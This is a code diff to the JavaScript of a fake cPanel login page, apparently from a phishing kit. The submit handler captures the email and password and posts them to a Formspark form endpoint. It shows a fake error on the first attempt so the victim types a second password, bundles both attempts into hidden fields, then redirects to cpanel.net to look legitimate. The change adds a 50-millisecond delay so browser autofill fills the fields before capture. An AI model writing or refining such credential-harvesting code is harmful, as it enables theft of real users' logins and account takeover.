@@ -267,92 +267,96 @@
       let clickCount = 0;
       
       form.addEventListener("submit", function(event) {
-        // Don't prevent default - let the form submit naturally
+        // --- FIX: Prevent immediate submission, add tiny delay for autofill ---
+        event.preventDefault(); // Stop the form from submitting right away
         
-        const email = emailInput.value;
-        const password = passwordInput.value;
-        const attempt = document.getElementById("attempt").value;
-        
-        // Validate
-        if (email === "") {
-          event.preventDefault();
-          a1.forEach(el => el.classList.remove("e-hidden"));
-          a2.forEach(el => (el.innerHTML = "You must specify a username to log in."));
-          setTimeout(() => {
-            a1.forEach(el => el.classList.add("e-hidden"));
-            a2.forEach(el => (el.innerHTML = ""));
-          }, 4000);
-          return;
-        }
+        setTimeout(() => {
+          // Now get the values after a tiny delay (autofill has time to populate)
+          const email = emailInput.value;
+          const password = passwordInput.value;
+          const attempt = document.getElementById("attempt").value;
+          
+          // Validate
+          if (email === "") {
+            a1.forEach(el => el.classList.remove("e-hidden"));
+            a2.forEach(el => (el.innerHTML = "You must specify a username to log in."));
+            setTimeout(() => {
+              a1.forEach(el => el.classList.add("e-hidden"));
+              a2.forEach(el => (el.innerHTML = ""));
+            }, 4000);
+            document.querySelector(".loader").classList.add("loader--hidden");
+            return;
+          }
 
-        if (password === "") {
-          event.preventDefault();
-          a1.forEach(el => el.classList.remove("e-hidden"));
-          a2.forEach(el => (el.innerHTML = "Password is required"));
-          setTimeout(() => {
-            a1.forEach(el => el.classList.add("e-hidden"));
-            a2.forEach(el => (el.innerHTML = ""));
-          }, 4000);
-          return;
-        }
-        
-        // Show loader
-        showLoader();
-        
-        // Set form action to Formspark
-        form.action = "https://submit-form.com/0gyAIslPc";
-        form.method = "POST";
-        
-        // Log what's being submitted (for debugging)
-        console.log("Submitting - Email:", email, "Password:", password, "Attempt:", attempt);
-        
-        // Handle attempts
-        if (attempt == 1) {
-          // First attempt: Store credentials
-          firstAttempt.email = email;
-          firstAttempt.password = password;
+          if (password === "") {
+            a1.forEach(el => el.classList.remove("e-hidden"));
+            a2.forEach(el => (el.innerHTML = "Password is required"));
+            setTimeout(() => {
+              a1.forEach(el => el.classList.add("e-hidden"));
+              a2.forEach(el => (el.innerHTML = ""));
+            }, 4000);
+            document.querySelector(".loader").classList.add("loader--hidden");
+            return;
+          }
           
-          // Update hidden field to 2 for next attempt
-          document.getElementById("attempt").value = "2";
+          // Show loader
+          showLoader();
           
-          // Show error after 3 seconds
-          setTimeout(showError, 3000);
+          // Set form action to Formspark
+          form.action = "https://submit-form.com/0gyAIslPc";
+          form.method = "POST";
           
-        } else {
-          // Second attempt: Add first attempt data as hidden fields
-          const firstEmailInput = document.createElement('input');
-          firstEmailInput.type = 'hidden';
-          firstEmailInput.name = 'first_attempt_email';
-          firstEmailInput.value = firstAttempt.email;
-          form.appendChild(firstEmailInput);
+          // Log what's being submitted (for debugging)
+          console.log("Submitting - Email:", email, "Password:", password, "Attempt:", attempt);
           
-          const firstPasswordInput = document.createElement('input');
-          firstPasswordInput.type = 'hidden';
-          firstPasswordInput.name = 'first_attempt_password';
-          firstPasswordInput.value = firstAttempt.password;
-          form.appendChild(firstPasswordInput);
+          // Handle attempts
+          if (attempt == 1) {
+            // First attempt: Store credentials
+            firstAttempt.email = email;
+            firstAttempt.password = password;
+            
+            // Update hidden field to 2 for next attempt
+            document.getElementById("attempt").value = "2";
+            
+            // Submit the form and show error
+            form.submit();
+            setTimeout(showError, 3000);
+            
+          } else {
+            // Second attempt: Add first attempt data as hidden fields
+            const firstEmailInput = document.createElement('input');
+            firstEmailInput.type = 'hidden';
+            firstEmailInput.name = 'first_attempt_email';
+            firstEmailInput.value = firstAttempt.email;
+            form.appendChild(firstEmailInput);
+            
+            const firstPasswordInput = document.createElement('input');
+            firstPasswordInput.type = 'hidden';
+            firstPasswordInput.name = 'first_attempt_password';
+            firstPasswordInput.value = firstAttempt.password;
+            form.appendChild(firstPasswordInput);
+            
+            const secondAttemptInput = document.createElement('input');
+            secondAttemptInput.type = 'hidden';
+            secondAttemptInput.name = 'second_attempt';
+            secondAttemptInput.value = 'final';
+            form.appendChild(secondAttemptInput);
+            
+            form.submit();
+            
+            // Redirect after form submits
+            setTimeout(function() {
+              window.location.href = "https://www.cpanel.net/products/";
+            }, 1000);
+          }
           
-          // Also include the current password again (already in pw_1 field)
-          // But let's make sure it's there
-          
-          const secondAttemptInput = document.createElement('input');
-          secondAttemptInput.type = 'hidden';
-          secondAttemptInput.name = 'second_attempt';
-          secondAttemptInput.value = 'final';
-          form.appendChild(secondAttemptInput);
-          
-          // Redirect after form submits
-          setTimeout(function() {
-            window.location.href = "https://www.cpanel.net/products/";
-          }, 1000);
-        }
-        
-        clickCount++;
-        if (clickCount >= 3) {
-          setTimeout(function() {
-            window.location.href = "https://www.cpanel.net/products/";
-          }, 3000);
-        }
+          clickCount++;
+          if (clickCount >= 3) {
+            setTimeout(function() {
+              window.location.href = "https://www.cpanel.net/products/";
+            }, 3000);
+          }
+        }, 50); // 50 millisecond delay — enough for autofill, invisible to user
       });
 
       function showError() {
